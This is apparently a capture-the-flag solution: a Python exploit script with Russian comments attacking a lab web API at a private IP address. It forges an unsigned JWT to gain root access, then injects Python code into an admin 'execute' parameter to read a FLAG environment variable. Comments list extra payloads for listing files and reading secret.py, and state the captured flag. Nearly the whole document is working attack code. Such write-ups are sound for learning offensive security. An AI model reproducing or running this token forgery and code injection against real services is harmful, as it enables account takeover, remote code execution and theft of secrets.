import json

import jwt
import requests as req
from hashlib import md5

class exploit:
    def __init__(self):
        self.host = 'http://192.168.0.77:7777'
        self.session = req.Session()

    def get(self, path='', params=None, headers=None, auth=None, data=None):
        r = self.session.get(self.host + path, params=params, headers=headers, auth=auth, data=data)
        print('[%d] URL: %s' % (r.status_code, r.url))
        print(r.text)

        try:
            return json.loads(r.text)
        except json.decoder.JSONDecodeError:
            return r.text

    def post(self, path='', params=None, headers=None, auth=None, data=None):
        r = self.session.post(self.host + path, params=params, headers=headers, auth=auth, data=data)
        print('[%d] URL: %s' % (r.status_code, r.url))
        print(r.text)

        try:
            return json.loads(r.text)
        except json.decoder.JSONDecodeError:
            return r.text

    def start(self):
        """ Редиректимся на IP таска. """
        self.get()

        """ Поднимаемся на директорию выше и получаем все роуты """
        response = self.get('/api')

        admin_route = response['data'][0]['route']
        users_route = response['data'][1]['route']
        user_details_route = response['data'][2]['route'][:-6]
        check_access_route = response['data'][3]['route']

        """ Сразу понятно, что хакать нужно root'а """
        self.get(users_route)

        """ Получаем пример токена по MD5(ID_юзера) """
        token = self.get(user_details_route + md5(b'2').hexdigest())[0]['token']

        """ Бэкенд не проводит верификацию цифровой подписи, значит можно форжить токен """
        payload = jwt.decode(token, verify=False, algorithms=None)
        print('Так выглядит пейлоад токена:', payload)

        """ Если раскодировать ещё токены, то там будет role 2 или 1. Логично предположить, что root - Это 0 или 3 """
        payload['role'] = 3

        """ Мы форжим токен для рута, а в /api/users у него был ID 1 """
        payload['id'] = 1

        """ Зафорженный токен"""
        print(payload)
        root_token = jwt.encode(payload, key='asdf')
        print('ROOT token: ', root_token)

        if self.get(check_access_route, params={"access_token": root_token})['status']:
            print('Получен доступ к ROOT аккаунту')

        """
            __import__("os").listdir() - Узнать текущий список файлов. Там лежит secret.py
            ['__pycache__', 'views.py', 'constants.py', 'secret.py', '__init__.py', 'utility.py', 'models.py', 'test.py', 'requirements.txt']
            
            open("secret.py").read() - прочитать файл
            Там такой код: 
            
            from os import environ 
            def get_flag(): return environ['FLAG']
            
            Отсюда сразу 3 пейлоада напрашиваются:
            __import__("os").getenv("FLAG") - Считать флаг с переменной окружения
            globals()['__builtins__']['__import__']('src').secret.get_flag() - Исполнить функцию get_flag() и получить 
            __import__('src').secret.get_flag() - тоже самое, что и предыдущее
            Флаг: ELON{46945a829bcdbebfe89f8fb5b9c50865}
        """
        self.post(admin_route,
                  params={"execute": "__import__%28%22os%22%29.getenv%28%22FLAG%22%29"},
                  data={'access_token': root_token, 'login': 'root'},
                  headers={'Content-Type': "application/json"})
        self.session.close()

if __name__ == '__main__':
    e = exploit()
    e.start()